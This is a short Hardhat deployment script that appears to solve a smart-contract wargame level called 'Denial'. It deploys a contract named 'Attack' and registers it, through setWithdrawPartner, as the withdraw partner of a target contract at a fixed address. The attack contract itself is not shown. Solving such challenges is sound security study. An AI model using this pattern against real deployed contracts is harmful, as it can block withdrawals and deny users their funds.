// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// When running the script with `npx hardhat run <script>` you'll find the Hardhat
// Runtime Environment's members available in the global scope.
import { ethers } from "hardhat";

async function main() {
  // get Denial contract
  const INSTANCE_ADDRESS = "0x1840Ab3f0A8655ee21F6F671b5E699a4ACE6CFa3"
  const denial = await ethers.getContractAt("Denial", INSTANCE_ADDRESS)

  // deploy attack
  const Attack = await ethers.getContractFactory("Attack")
  const attack = await Attack.deploy()
  await attack.deployed()
  console.log(`attack contract deployed at ${attack.address}`)

  // set withdraw partner
  const setTx = await denial.setWithdrawPartner(attack.address)
  await setTx.wait(4)
  console.log("SUCCESS set withdraw partner")

}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
